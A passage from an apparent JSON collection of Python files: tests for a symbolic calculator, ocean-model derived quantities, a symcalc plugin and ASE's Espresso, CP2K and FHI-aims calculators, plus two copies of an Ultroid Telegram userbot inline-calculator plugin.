Calc.LexTag.VARIABLE, 12)\n    var = Calc.Variable(token)\n    var.a = 2\n    var.b = 1\n    var = -var\n    assert var.a == -2\n    assert var.b == -1\n\n\ndef test_variable_init_add():\n    token = Calc.Token('24.67', Calc.LexType.NUMBER, Calc.LexTag.NUMBER, 12)\n    var1 = Calc.Variable(token)\n    token = Calc.Token('10.12', Calc.LexType.NUMBER, Calc.LexTag.NUMBER, 12)\n    var2 = Calc.Variable(token)\n    var3 = var1+var2\n    assert var3.a == 0\n    assert var3.b == 34.79\n\n    token = Calc.Token('x', Calc.LexType.VARIABLE, Calc.LexTag.VARIABLE, 12)\n    var2 = Calc.Variable(token)\n    var2.a = 2\n    var2.b = 1\n\n    var3 = var1+var2\n    assert var3.a == 2\n    assert var3.b == 25.67\n\n\ndef test_variable_init_sub():\n    token = Calc.Token('25.50', Calc.LexType.NUMBER, Calc.LexTag.NUMBER, 12)\n    var1 = Calc.Variable(token)\n    token = Calc.Token('10.10', Calc.LexType.NUMBER, Calc.LexTag.NUMBER, 12)\n    var2 = Calc.Variable(token)\n    var3 = var1-var2\n    assert var3.a == 0\n    assert var3.b == 15.4\n\n    token = Calc.Token('x', Calc.LexType.VARIABLE, Calc.LexTag.VARIABLE, 12)\n    var2 = Calc.Variable(token)\n    var2.a = 2\n    var2.b = 1\n\n    var3 = var1-var2\n\n    assert var3.a == -2\n    assert var3.b == 24.5\n\n\n@raises(Calc.CalculatorError)\ndef test_variable_init_mul_var_var():\n    token = Calc.Token('x', Calc.LexType.VARIABLE, Calc.LexTag.VARIABLE, 12)\n    var1 = Calc.Variable(token)\n    var1.a = 2\n    var1.b = 1\n\n    token = Calc.Token('x', Calc.LexType.VARIABLE, Calc.LexTag.VARIABLE, 12)\n    var2 = Calc.Variable(token)\n    var2.a = 2\n    var2.b = 1\n\n    var3 = var1 * var2\n\n\ndef test_variable_init_mul_num_num():\n    token = Calc.Token('7', Calc.LexType.NUMBER, Calc.LexTag.NUMBER, 12)\n    var1 = Calc.Variable(token)\n    token = Calc.Token('3.1', Calc.LexType.NUMBER, Calc.LexTag.NUMBER, 12)\n    var2 = Calc.Variable(token)\n    var3 = var1*var2\n\n    assert var3.a == 0\n    assert var3.b == 21.7\n    assert var3.type == Calc.LexType.NUMBER\n\n\ndef test_variable_init_mul_num_var():\n    token = Calc.Token('7', Calc.LexType.NUMBER, Calc.LexTag.NUMBER, 12)\n    var1 = Calc.Variable(token)\n    token = Calc.Token('x', Calc.LexType.VARIABLE, Calc.LexTag.VARIABLE, 12)\n    var2 = Calc.Variable(token)\n    var2.a = 2\n    var2.b = 1\n\n    var3 = var1*var2\n\n    assert var3.a == 14.0\n    assert var3.b == 7.0\n    assert var3.type == Calc.LexType.VARIABLE\n\n\ndef test_variable_init_mul_var_num():\n    token = Calc.Token('7', Calc.LexType.NUMBER, Calc.LexTag.NUMBER, 12)\n    var1 = Calc.Variable(token)\n    token = Calc.Token('x', Calc.LexType.VARIABLE, Calc.LexTag.VARIABLE, 12)\n    var2 = Calc.Variable(token)\n    var2.a = 2\n    var2.b = 1\n\n    var3 = var2*var1\n\n    assert var3.a == 14.0\n    assert var3.b == 7.0\n    assert var3.type == Calc.LexType.VARIABLE\n\n\n@raises(Calc.CalculatorError)\ndef test_variable_init_div_x_var():\n    token = Calc.Token('7', Calc.LexType.NUMBER, Calc.LexTag.NUMBER, 12)\n    var1 = Calc.Variable(token)\n    token = Calc.Token('x', Calc.LexType.VARIABLE, Calc.LexTag.VARIABLE, 12)\n    var2 = Calc.Variable(token)\n    var2.a = 2\n    var2.b = 1\n    var3 = var1/var2\n\n\n@raises(Calc.CalculatorError)\ndef test_variable_init_div_x_zero():\n    token = Calc.Token('7', Calc.LexType.NUMBER, Calc.LexTag.NUMBER, 12)\n    var1 = Calc.Variable(token)\n    token = Calc.Token('0', Calc.LexType.NUMBER, Calc.LexTag.NUMBER, 12)\n    var2 = Calc.Variable(token)\n    var3 = var1/var2\n\n\ndef test_variable_init_div_num_num():\n    token = Calc.Token('18', Calc.LexType.NUMBER, Calc.LexTag.NUMBER, 12)\n    var1 = Calc.Variable(token)\n\n    token = Calc.Token('2', Calc.LexType.NUMBER, Calc.LexTag.NUMBER, 12)\n    var2 = Calc.Variable(token)\n\n    var3 = var1/var2\n    print(\"=%s=\" % repr(var3.a))\n\n    assert var3.a == 0.0\n    assert var3.b == 9.0\n    assert var3.type == Calc.LexType.NUMBER\n\n\ndef test_variable_init_div_var_num():\n    token = Calc.Token('x', Calc.LexType.VARIABLE, Calc.LexTag.VARIABLE, 12)\n    var1 = Calc.Variable(token)\n    var1.a = 10\n    var1.b = 14\n\n    token = Calc.Token('2', Calc.LexType.NUMBER, Calc.LexTag.NUMBER, 12)\n    var2 = Calc.Variable(token)\n\n    var3 = var1/var2\n    assert var3.a == 5.0\n    assert var3.b == 7.0\n    assert var3.type == Calc.LexType.VARIABLE\n\n\ndef test_variable_init_exp_num_num():\n    token = Calc.Token('2', Calc.LexType.NUMBER, Calc.LexTag.NUMBER, 12)\n    var1 = Calc.Variable(token)\n    token = Calc.Token('3', Calc.LexType.NUMBER, Calc.LexTag.NUMBER, 12)\n    var2 = Calc.Variable(token)\n\n    var3 = var1**var2\n    assert var3.a == 0.0\n    assert var3.b == 8.0\n    assert var3.type == Calc.LexType.NUMBER\n\n\n@raises(Calc.CalculatorError)\ndef test_variable_init_exp_num_var():\n    token = Calc.Token('2', Calc.LexType.NUMBER, Calc.LexTag.NUMBER, 12)\n    var1 = Calc.Variable(token)\n    token = Calc.Token('x', Calc.LexType.VARIABLE, Calc.LexTag.VARIABLE, 12)\n    var2 = Calc.Variable(token)\n\n    var3 = var1**var2\n\n\n@raises(Calc.CalculatorError)\ndef test_variable_init_exp_num_var():\n    token = Calc.Token('2', Calc.LexType.NUMBER, Calc.LexTag.NUMBER, 12)\n    var1 = Calc.Variable(token)\n    token = Calc.Token('x', Calc.LexType.VARIABLE, Calc.LexTag.VARIABLE, 12)\n    var2 = Calc.Variable(token)\n\n    var3 = var2**var1\n", "104": "import pytest\nimport numpy as np\nimport xarray as xr\n\nfrom momlevel import derived\nfrom momlevel.test_data import generate_test_data\nfrom momlevel.test_data import generate_test_data_dz\nfrom momlevel.test_data import generate_test_data_uv\n\ndset1 = generate_test_data()\ndset2 = generate_test_data_dz()\ndset3 = generate_test_data_uv()\n\n\ndef test_adjust_negative_n2():\n    obvfsq = derived.calc_n2(dset1.thetao, dset1.so)\n    adjusted = derived.adjust_negative_n2(obvfsq)\n    assert np.allclose(adjusted.sum(), 0.50181224)\n\n\ndef test_calc_coriolis():\n    coriolis = derived.calc_coriolis(dset1.geolat)\n    assert np.allclose(coriolis.sum(), 2.71050543e-20)\n\n\ndef test_calc_dz_1():\n    dz = derived.calc_dz(dset2.z_l, dset2.z_i, dset2.deptho)\n    assert np.allclose(dz.sum(), 1261.33383326)\n\n\ndef test_calc_dz_2():\n    dz = derived.calc_dz(dset2.z_l, dset2.z_i, dset2.deptho, fraction=True)\n    assert np.allclose(dz.sum(), 91.82404981)\n\n\ndef test_calc_dz_3():\n    deptho = dset2.deptho.copy()\n    deptho[4, 4] = -200.0\n    with pytest.raises(Exception):\n        derived.calc_dz(dset2.z_l, dset2.z_i, deptho)\n\n\ndef test_calc_rho():\n    rho = derived.calc_rho(dset1.thetao, dset1.so, dset1.z_l * 1.0e4, eos=\"Wright\")\n    pytest.rho = rho\n    assert np.allclose(rho.sum(), 643847.01494266)\n\n\ndef test_calc_n2_1():\n    obvfsq = derived.calc_n2(dset1.thetao, dset1.so)\n    assert np.allclose(obvfsq.sum(), 0.11750034)\n\n\ndef test_calc_n2_2():\n    obvfsq = derived.calc_n2(dset1.thetao, dset1.so, adjust_negative=True)\n    assert np.allclose(obvfsq.sum(), 0.50181224)\n\n\ndef test_calc_pdens_1():\n    rhopot = derived.calc_pdens(dset1.thetao, dset1.so, eos=\"Wright\")\n    assert np.allclose(rhopot.sum(), 641153.07032298)\n\n\ndef test_calc_pdens_2():\n    rhopot = derived.calc_pdens(dset1.thetao, dset1.so, level=2000.0, eos=\"Wright\")\n    assert np.allclose(rhopot.sum(), 646547.38808142)\n\n\ndef test_calc_alpha():\n    alpha = derived.calc_alpha(dset1.thetao, dset1.so, dset1.z_l * 1.0e4, eos=\"Wright\")\n    assert np.allclose(alpha.sum(), 0.14270076)\n\n\ndef test_calc_beta():\n    beta = derived.calc_beta(dset1.thetao, dset1.so, dset1.z_l * 1.0e4, eos=\"Wright\")\n    assert np.allclose(beta.sum(), 0.46398704)\n\n\ndef test_calc_masso():\n    masso = derived.calc_masso(pytest.rho, dset1.volcello)\n    pytest.masso = masso\n    assert np.allclose(masso.sum(), 6.43066545e08)\n\n\ndef test_calc_volo_1():\n    with pytest.raises(Exception):\n        result = derived.calc_volo(dset1.volcello)\n\n\ndef test_calc_volo_1():\n    volo = derived.calc_volo(dset1.volcello.isel(time=0))\n    pytest.volo = volo\n    assert np.allclose(volo, 125401.86252394)\n\n\ndef test_rhoga():\n    rhoga = derived.calc_rhoga(pytest.masso, pytest.volo)\n    assert np.allclose(rhoga.sum(), 5128.04620652)\n\n\ndef test_calc_rel_vort():\n    result = derived.calc_rel_vort(dset3)\n    assert np.allclose(result.sum(), -6.92989256e-14)\n\n\ndef test_calc_pv_1():\n    zeta = derived.calc_rel_vort(dset3)\n    n2 = derived.calc_n2(dset1.thetao, dset1.so)\n    pv = derived.calc_pv(zeta, dset3.Coriolis, n2, units=\"m\")\n    assert np.allclose(pv.sum(), 1.00501238e-07)\n\n\ndef test_calc_pv_2():\n    zeta = derived.calc_rel_vort(dset3)\n    n2 = derived.calc_n2(dset1.thetao, dset1.so)\n    pv = derived.calc_pv(zeta, dset3.Coriolis, n2, units=\"cm\")\n    assert np.allclose(pv.sum(), 2515708.91532095)\n\n\ndef test_calc_rossby_rd():\n    n2 = derived.calc_n2(dset1.thetao, dset1.so)\n    dz = derived.calc_dz(dset1.z_l, dset1.z_i, dset1.deptho)\n    wave_speed = derived.calc_wave_speed(n2, dz)\n    coriolis = derived.calc_coriolis(dset1.geolat)\n    rossby_rd = derived.calc_rossby_rd(wave_speed, coriolis)\n    rossby_rd = xr.where(xr.ufuncs.isinf(rossby_rd), np.nan, rossby_rd)\n    assert np.allclose(rossby_rd.sum(), 11779400.69254739)\n\n\ndef test_calc_spice():\n    pi = derived.calc_spice(dset1.thetao, dset1.so)\n    assert np.allclose(pi.sum(), 1341.51468477)\n\n\ndef test_calc_stability_angle():\n    tu_ang = derived.calc_stability_angle(\n        dset1.thetao, dset1.so, dset1.z_l * 1.0e4, eos=\"Wright\"\n    )\n    assert np.allclose(tu_ang.sum(), 229.53184304)\n\n\ndef test_calc_wave_speed():\n    n2 = derived.calc_n2(dset1.thetao, dset1.so)\n    dz = derived.calc_dz(dset1.z_l, dset1.z_i, dset1.deptho)\n    wave_speed = derived.calc_wave_speed(n2, dz)\n    assert np.allclose(wave_speed.sum(), 1423.93496635)\n", "105": "# Ultroid - UserBot\n# Copyright (C) 2021 TeamUltroid\n#\n# This file is a part of < https://github.com/TeamUltroid/Ultroid/ >\n# PLease read the GNU Affero General Public License in\n# .\n\"\"\"\n\u2718 Commands Available -\n\n\u2022`{i}calc` - Inline Calculator\n\n\"\"\"\nimport re\n\nfrom . import *\n\nCALC = {}\n\nm = [\n    \"AC\",\n    \"C\",\n    \"\u232b\",\n    \"%\",\n    \"7\",\n    \"8\",\n    \"9\",\n    \"+\",\n    \"4\",\n    \"5\",\n    \"6\",\n    \"-\",\n    \"1\",\n    \"2\",\n    \"3\",\n    \"x\",\n    \"00\",\n    \"0\",\n    \".\",\n    \"\u00f7\",\n]\ntultd = [Button.inline(f\"{x}\", data=f\"calc{x}\") for x in m]\nlst = list(zip(tultd[::4], tultd[1::4], tultd[2::4], tultd[3::4]))\nlst.append([Button.inline(\"=\", data=\"calc=\")])\n\n\n@ultroid_cmd(pattern=\"calc\")\nasync def icalc(e):\n    udB.delete(\"calc\")\n    if e.client._bot:\n        return await e.reply(\"\u2022 Ultroid Inline Calculator \u2022\", buttons=lst)\n    results = await e.client.inline_query(asst.me.username, \"calc\")\n    await results[0].click(e.chat_id, silent=True, hide_via=True)\n    await e.delete()\n\n\n@in_pattern(\"calc\")\n@in_owner\nasync def _(e):\n    calc = e.builder.article(\"Calc\", text=\"\u2022 Ultroid Inline Calculator \u2022\", buttons=lst)\n    await e.answer([calc])\n\n\n@callback(re.compile(\"calc(.*)\"))\n@owner\nasync def _(e):\n    x = (e.data_match.group(1)).decode()\n    user = e.query.user_id\n    get = None\n    if x == \"AC\":\n        if CALC.get(user):\n            CALC.pop(user)\n        await e.edit(\n            \"\u2022 Ultroid Inline Calculator \u2022\",\n            buttons=[Button.inline(\"Open Calculator Again\", data=\"recalc\")],\n        )\n    elif x == \"C\":\n        if CALC.get(user):\n            CALC.pop(user)\n        await e.answer(\"cleared\")\n    elif x == \"\u232b\":\n        if CALC.get(user):\n            get = CALC[user]\n        if get:\n            CALC.update({user: get[:-1]})\n            await e.answer(str(get[:-1]))\n    elif x == \"%\":\n        if CALC.get(user):\n            get = CALC[user]\n        if get:\n            CALC.update({user: get + \"/100\"})\n            await e.answer(str(get + \"/100\"))\n    elif x == \"\u00f7\":\n        if CALC.get(user):\n            get = CALC[user]\n        if get:\n            CALC.update({user: get + \"/\"})\n            await e.answer(str(get + \"/\"))\n    elif x == \"x\":\n        if CALC.get(user):\n            get = CALC[user]\n        if get:\n            CALC.update({user: get + \"*\"})\n            await e.answer(str(get + \"*\"))\n    elif x == \"=\":\n        if CALC.get(user):\n            get = CALC[user]\n        if get:\n            if get.endswith((\"*\", \".\", \"/\", \"-\", \"+\")):\n                get = get[:-1]\n            out = eval(get)\n            try:\n                num = float(out)\n                await e.answer(f\"Answer : {num}\", cache_time=0, alert=True)\n            except BaseException:\n                CALC.pop(user)\n                await e.answer(\"Error\", cache_time=0, alert=True)\n        await e.answer(\"None\")\n    else:\n        if CALC.get(user):\n            get = CALC[user]\n        if get:\n            CALC.update({user: get + x})\n            return await e.answer(str(get + x))\n        CALC.update({user: x})\n        await e.answer(str(x))\n\n\n@callback(\"recalc\")\n@owner\nasync def _(e):\n    m = [\n        \"AC\",\n        \"C\",\n        \"\u232b\",\n        \"%\",\n        \"7\",\n        \"8\",\n        \"9\",\n        \"+\",\n        \"4\",\n        \"5\",\n        \"6\",\n        \"-\",\n        \"1\",\n        \"2\",\n        \"3\",\n        \"x\",\n        \"00\",\n        \"0\",\n        \".\",\n        \"\u00f7\",\n    ]\n    tultd = [Button.inline(f\"{x}\", data=f\"calc{x}\") for x in m]\n    lst = list(zip(tultd[::4], tultd[1::4], tultd[2::4], tultd[3::4]))\n    lst.append([Button.inline(\"=\", data=\"calc=\")])\n    await e.edit(\"Noice Inline Calculator\", buttons=lst)\n", "106": "# Ultroid - UserBot\n# Copyright (C) 2021 TeamUltroid\n#\n# This file is a part of < https://github.com/TeamUltroid/Ultroid/ >\n# PLease read the GNU Affero General Public License in\n# .\n\"\"\"\n\u2718 Commands Available -\n\n\u2022`{i}calc` - Inline Calculator\n\n\"\"\"\nimport re\n\nfrom . import *\n\nCALC = {}\n\nm = [\n    \"AC\",\n    \"C\",\n    \"\u232b\",\n    \"%\",\n    \"7\",\n    \"8\",\n    \"9\",\n    \"+\",\n    \"4\",\n    \"5\",\n    \"6\",\n    \"-\",\n    \"1\",\n    \"2\",\n    \"3\",\n    \"x\",\n    \"00\",\n    \"0\",\n    \".\",\n    \"\u00f7\",\n]\ntultd = [Button.inline(f\"{x}\", data=f\"calc{x}\") for x in m]\nlst = list(zip(tultd[::4], tultd[1::4], tultd[2::4], tultd[3::4]))\nlst.append([Button.inline(\"=\", data=\"calc=\")])\n\n\n@ultroid_cmd(pattern=\"calc\")\nasync def icalc(e):\n    udB.delete(\"calc\")\n    if e.client._bot:\n        return await e.reply(\"\u2022 Ultroid Inline Calculator \u2022\", buttons=lst)\n    results = await e.client.inline_query(asst.me.username, \"calc\")\n    await results[0].click(e.chat_id, silent=True, hide_via=True)\n    await e.delete()\n\n\n@in_pattern(\"calc\")\n@in_owner\nasync def _(e):\n    calc = e.builder.article(\"Calc\", text=\"\u2022 Ultroid Inline Calculator \u2022\", buttons=lst)\n    await e.answer([calc])\n\n\n@callback(re.compile(\"calc(.*)\"))\n@owner\nasync def _(e):\n    x = (e.data_match.group(1)).decode()\n    user = e.query.user_id\n    get = None\n    if x == \"AC\":\n        if CALC.get(user):\n            CALC.pop(user)\n        await e.edit(\n            \"\u2022 Ultroid Inline Calculator \u2022\",\n            buttons=[Button.inline(\"Open Calculator Again\", data=\"recalc\")],\n        )\n    elif x == \"C\":\n        if CALC.get(user):\n            CALC.pop(user)\n        await e.answer(\"cleared\")\n    elif x == \"\u232b\":\n        if CALC.get(user):\n            get = CALC[user]\n        if get:\n            CALC.update({user: get[:-1]})\n            await e.answer(str(get[:-1]))\n    elif x == \"%\":\n        if CALC.get(user):\n            get = CALC[user]\n        if get:\n            CALC.update({user: get + \"/100\"})\n            await e.answer(str(get + \"/100\"))\n    elif x == \"\u00f7\":\n        if CALC.get(user):\n            get = CALC[user]\n        if get:\n            CALC.update({user: get + \"/\"})\n            await e.answer(str(get + \"/\"))\n    elif x == \"x\":\n        if CALC.get(user):\n            get = CALC[user]\n        if get:\n            CALC.update({user: get + \"*\"})\n            await e.answer(str(get + \"*\"))\n    elif x == \"=\":\n        if CALC.get(user):\n            get = CALC[user]\n        if get:\n            if get.endswith((\"*\", \".\", \"/\", \"-\", \"+\")):\n                get = get[:-1]\n            out = eval(get)\n            try:\n                num = float(out)\n                await e.answer(f\"Answer : {num}\", cache_time=0, alert=True)\n            except BaseException:\n                CALC.pop(user)\n                await e.answer(\"Error\", cache_time=0, alert=True)\n        await e.answer(\"None\")\n    else:\n        if CALC.get(user):\n            get = CALC[user]\n        if get:\n            CALC.update({user: get + x})\n            return await e.answer(str(get + x))\n        CALC.update({user: x})\n        await e.answer(str(x))\n\n\n@callback(\"recalc\")\n@owner\nasync def _(e):\n    m = [\n        \"AC\",\n        \"C\",\n        \"\u232b\",\n        \"%\",\n        \"7\",\n        \"8\",\n        \"9\",\n        \"+\",\n        \"4\",\n        \"5\",\n        \"6\",\n        \"-\",\n        \"1\",\n        \"2\",\n        \"3\",\n        \"x\",\n        \"00\",\n        \"0\",\n        \".\",\n        \"\u00f7\",\n    ]\n    tultd = [Button.inline(f\"{x}\", data=f\"calc{x}\") for x in m]\n    lst = list(zip(tultd[::4], tultd[1::4], tultd[2::4], tultd[3::4]))\n    lst.append([Button.inline(\"=\", data=\"calc=\")])\n    await e.edit(\"Noice Inline Calculator\", buttons=lst)\n", "107": "from symcalc.plugins.additions.cis import AddCisFunction\nfrom tests import TestCalculator\n\n\ndef test_plugin_cis_instantiate():\n    AddCisFunction()\n\n\ndef test_plugin_cis_hook():\n    calc = TestCalculator()\n    plugin = AddCisFunction()\n    calc.register_plugin(plugin)\n    assert plugin in calc.plugins\n\n\ndef test_plugin_cis_context_updated():\n    calc = TestCalculator()\n    calc.register_plugin(AddCisFunction())\n    assert calc.chksym(\"cis\")\n    assert callable(calc.getsym(\"cis\"))\n\n\ndef test_plugin_cis_available():\n    calc = TestCalculator()\n    calc.register_plugin(AddCisFunction())\n    assert callable(calc.command(\"cis\"))\n\n\ndef test_plugin_cis_example():\n    calc = TestCalculator()\n    calc.register_plugin(AddCisFunction())\n    assert calc.command(\"2*cis(pi/3)\") == calc.command(\"1+sqrt(3)*I\")\n\n\ndef test_plugin_cis_validate_values():\n    calc = TestCalculator()\n    calc.register_plugin(AddCisFunction())\n    assert calc.command(\"2*cis(pi/6)\") == calc.command(\"sqrt(3)+I\")\n    assert calc.command(\"2*cis(pi/4)\") == calc.command(\"sqrt(2)+sqrt(2)*I\")\n    assert calc.command(\"2*cis(pi/3)\") == calc.command(\"1+sqrt(3)*I\")\n    assert calc.command(\"cis(pi/2)\") == calc.command(\"I\")\n    assert calc.command(\"2*cis(2*pi/3)\") == calc.command(\"-1+sqrt(3)*I\")\n    assert calc.command(\"2*cis(3*pi/4)\") == calc.command(\"-sqrt(2)+sqrt(2)*I\")\n    assert calc.command(\"2*cis(5*pi/6)\") == calc.command(\"-sqrt(3)+I\")\n    assert calc.command(\"2*cis(7*pi/6)\") == calc.command(\"-sqrt(3)-I\")\n    assert calc.command(\"2*cis(5*pi/4)\") == calc.command(\"-sqrt(2)-sqrt(2)*I\")\n    assert calc.command(\"2*cis(4*pi/3)\") == calc.command(\"-1-sqrt(3)*I\")\n    assert calc.command(\"cis(3*pi/2)\") == calc.command(\"-I\")\n    assert calc.command(\"2*cis(5*pi/3)\") == calc.command(\"1-sqrt(3)*I\")\n    assert calc.command(\"2*cis(7*pi/4)\") == calc.command(\"sqrt(2)-sqrt(2)*I\")\n    assert calc.command(\"2*cis(11*pi/6)\") == calc.command(\"sqrt(3)-I\")\n\n\ndef test_plugin_cis_validate_abs():\n    calc = TestCalculator()\n    calc.register_plugin(AddCisFunction())\n    for i in range(-50, 50):\n        assert calc.command(f\"simplify(abs(cis({i})))\") == 1\n", "108": "import pytest\nfrom ase.build import bulk\nfrom ase.calculators.espresso import EspressoProfile, Espresso\n\n\nespresso_versions = [\n    ('6.4.1', \"\"\"\nProgram PWSCF v.6.4.1 starts on  5Aug2021 at 11: 2:26\n\nThis program is part of the open-source Quantum ESPRESSO suite\n\"\"\"),\n    ('6.7MaX', \"\"\"\n\nProgram PWSCF v.6.7MaX starts on  1Oct2022 at 16:26:59\n\nThis program is part of the open-source Quantum ESPRESSO suite\n\"\"\")]\n\n\n@pytest.mark.parametrize('version, txt', espresso_versions)\ndef test_version(version, txt):\n    assert EspressoProfile.parse_version(txt) == version\n\n\ndef test_version_integration(espresso_factory):\n    profile = EspressoProfile([espresso_factory.executable])\n    version = profile.version()\n    assert version[0].isdigit()\n\n\ndef verify(calc):\n    assert calc.get_fermi_level() is not None\n    assert calc.get_ibz_k_points() is not None\n    assert calc.get_eigenvalues(spin=0, kpt=0) is not None\n    assert calc.get_number_of_spins() is not None\n    assert calc.get_k_point_weights() is not None\n\n\n@pytest.mark.calculator_lite\ndef test_main(espresso_factory):\n    atoms = bulk('Si')\n    atoms.calc = espresso_factory.calc()\n    atoms.get_potential_energy()\n    verify(atoms.calc)\n\n\n@pytest.mark.calculator_lite\ndef test_smearing(espresso_factory):\n    atoms = bulk('Cu')\n    input_data = {'system': {'occupations': 'smearing',\n                             'smearing': 'fermi-dirac',\n                             'degauss': 0.02}}\n    atoms.calc = espresso_factory.calc(input_data=input_data)\n    atoms.get_potential_energy()\n    verify(atoms.calc)\n\n\ndef test_warn_label():\n    with pytest.warns(FutureWarning):\n        Espresso(label='hello')\n\n\ndef test_error_command():\n    with pytest.raises(RuntimeError):\n        Espresso(command='hello')\n", "109": "\"\"\"Tests for the CP2K ASE calulator.\n\nhttp://www.cp2k.org\nAuthor: Ole Schuett \n\"\"\"\n\nfrom ase.build import molecule\nfrom ase.optimize import BFGS\nimport pytest\nfrom ase.calculators.calculator import CalculatorSetupError\nfrom ase import units\nfrom ase.atoms import Atoms\nfrom ase.md.velocitydistribution import MaxwellBoltzmannDistribution\nfrom ase.md.verlet import VelocityVerlet\n\n\n@pytest.fixture\ndef atoms():\n    return molecule('H2', vacuum=2.0)\n\n\ndef test_geoopt(cp2k_factory, atoms):\n    calc = cp2k_factory.calc(label='test_H2_GOPT', print_level='LOW')\n    atoms.calc = calc\n\n    gopt = BFGS(atoms, logfile=None)\n    gopt.run(fmax=1e-6)\n\n    dist = atoms.get_distance(0, 1)\n    dist_ref = 0.7245595\n    assert (dist - dist_ref) / dist_ref < 1e-7\n\n    energy_ref = -30.7025616943\n    energy = atoms.get_potential_energy()\n    assert (energy - energy_ref) / energy_ref < 1e-10\n\n\ndef test_h2_lda(cp2k_factory, atoms):\n    calc = cp2k_factory.calc(label='test_H2_LDA')\n    atoms.calc = calc\n    energy = atoms.get_potential_energy()\n    energy_ref = -30.6989595886\n    diff = abs((energy - energy_ref) / energy_ref)\n    assert diff < 1e-10\n\n\ndef test_h2_libxc(cp2k_factory, atoms):\n    calc = cp2k_factory.calc(\n        xc='XC_GGA_X_PBE XC_GGA_C_PBE',\n        pseudo_potential=\"GTH-PBE\",\n        label='test_H2_libxc')\n    atoms.calc = calc\n    energy = atoms.get_potential_energy()\n    energy_ref = -31.591716529642\n    diff = abs((energy - energy_ref) / energy_ref)\n    assert diff < 1e-10\n\n\ndef test_h2_ls(cp2k_factory, atoms):\n    inp = \"\"\"&FORCE_EVAL\n               &DFT\n                 &QS\n                   LS_SCF ON\n                 &END QS\n               &END DFT\n             &END FORCE_EVAL\"\"\"\n    calc = cp2k_factory.calc(label='test_H2_LS', inp=inp)\n    atoms.calc = calc\n    energy = atoms.get_potential_energy()\n    energy_ref = -30.6989581747\n    diff = abs((energy - energy_ref) / energy_ref)\n    assert diff < 5e-7\n\n\ndef test_h2_pbe(cp2k_factory, atoms):\n    calc = cp2k_factory.calc(xc='PBE', label='test_H2_PBE')\n    atoms.calc = calc\n    energy = atoms.get_potential_energy()\n    energy_ref = -31.5917284949\n    diff = abs((energy - energy_ref) / energy_ref)\n    assert diff < 1e-10\n\n\ndef test_md(cp2k_factory):\n    calc = cp2k_factory.calc(label='test_H2_MD')\n    positions = [(0, 0, 0), (0, 0, 0.7245595)]\n    atoms = Atoms('HH', positions=positions, calculator=calc)\n    atoms.center(vacuum=2.0)\n\n    MaxwellBoltzmannDistribution(atoms, temperature_K=0.5 * 300,\n                                 force_temp=True)\n    energy_start = atoms.get_potential_energy() + atoms.get_kinetic_energy()\n    dyn = VelocityVerlet(atoms, 0.5 * units.fs)\n    dyn.run(20)\n\n    energy_end = atoms.get_potential_energy() + atoms.get_kinetic_energy()\n    assert abs(energy_start - energy_end) < 1e-4\n\n\ndef test_o2(cp2k_factory):\n    calc = cp2k_factory.calc(\n        label='test_O2', uks=True, cutoff=150 * units.Rydberg,\n        basis_set=\"SZV-MOLOPT-SR-GTH\")\n    o2 = molecule('O2', calculator=calc)\n    o2.center(vacuum=2.0)\n    energy = o2.get_potential_energy()\n    energy_ref = -861.057011375\n    diff = abs((energy - energy_ref) / energy_ref)\n    assert diff < 1e-10\n\n\ndef test_restart(cp2k_factory, atoms):\n    calc = cp2k_factory.calc()\n    atoms.calc = calc\n    atoms.get_potential_energy()\n    calc.write('test_restart')  # write a restart\n    calc2 = cp2k_factory.calc(restart='test_restart')  # load a restart\n    assert not calc2.calculation_required(atoms, ['energy'])\n\n\ndef test_unknown_keywords(cp2k_factory):\n    with pytest.raises(CalculatorSetupError):\n        cp2k_factory.calc(dummy_nonexistent_keyword='hello')\n", "110": "import tempfile\nimport os\n\nimport pytest\nfrom ase.calculators.aims import Aims\nfrom ase import Atoms\n\n@pytest.mark.skip('legacy test with hardcoded paths and commands')\ndef test_aims_interface():\n    # test the new command handling + legacy behavior\n    aims_command = 'aims.x'\n    aims_command_alternative = 'mpirun -np 4 fhiaims.x'\n    outfilename = 'alternative_aims.out'\n    outfilename_default = 'aims.out'\n    command = '{0:s} > {1:s}'.format(aims_command, outfilename)\n    #command_alternative = '{0:s} > {1:s}'.format(aims_command_alternative, outfilename)\n    command_default = '{0:s} > {1:s}'.format(aims_command, outfilename_default)\n    legacy_command = 'aims.version.serial.x > aims.out'\n    legacy_aims_command = legacy_command.split('>')[0].strip()\n    legacy_outfilename = legacy_command.split('>')[-1].strip()\n\n    # legacy behavior of empty init\n    calc = Aims()\n    assert calc.command == legacy_command\n    assert calc.outfilename == legacy_outfilename\n    assert calc.aims_command == legacy_aims_command\n\n    # behavior of empty init with env variable\n    os.environ['ASE_AIMS_COMMAND'] = aims_command_alternative\n    calc = Aims()\n    assert calc.command == '{0} > {1}'.format(aims_command_alternative, outfilename_default)\n    assert calc.outfilename == outfilename_default\n    assert calc.aims_command == aims_command_alternative\n\n    # legacy behavior of \"proper\" command\n    calc = Aims(run_command=command)\n    assert calc.command == command\n    assert calc.outfilename == outfilename\n    assert calc.aims_command == aims_command\n\n    # legacy behavior of an \"improper\" command\n    calc = Aims(run_command=aims_command)\n    assert calc.command == command_default\n    assert calc.aims_command == aims_command\n    assert calc.outfilename == outfilename_default\n\n    # fixed \"command\"  behavior\n    calc = Aims(command=command)\n    assert calc.command == command\n    assert calc.outfilename == outfilename\n    assert calc.aims_command == aims_command\n\n    # novel way to use aims_command, no specific outfile\n    calc = Aims(aims_command=aims_command)\n    assert calc.command == command_default\n    assert calc.outfilename == outfilename_default\n    assert calc.aims_command == aims_command\n\n    calc = Aims(aims_command=aims_command,\n                outfilename=outfilename)\n    assert calc.command == command\n    assert calc.outfilename == outfilename\n    assert calc.aims_command == aims_command\n\n    # # testing the setters\n    calc.command = command_default\n    assert calc.outfilename == outfilename_default\n    assert calc.aims_command == aims_command\n    assert calc.command == command_default\n\n    #calc.set_aims_command(aims_command_alternative)\n    calc.aims_command = aims_command_alternative\n    assert calc.aims_command == aims_command_alternative\n    assert calc.outfilename == outfilename_default\n    assert calc.command == '{} > {}'.format(aims_command_alternative, outfilename_default)\n\n    calc.outfilename = outfilename\n    assert calc.command == '{} > {}'.format(aims_command_alternative, outfilename)\n    assert calc.aims_command == aims_command_alternative\n    assert calc.outfilename == outfilename\n\n\n    # test writing files\n    tmp_dir = tempfile.mkdtemp()\n    water = Atoms('HOH', [(1, 0, 0), (0, 0, 0), (0, 1, 0)])\n    calc = Aims(xc='PBE',\n                output=['dipole'],\n                sc_accuracy_etot=1e-6,\n                sc_accuracy_eev=1e-3,\n                sc_accuracy_rho=1e-6,\n                species_dir=\"/data/rittmeyer/FHIaims/species_defaults/light/\",\n                sc_accuracy_forces=1e-4,\n                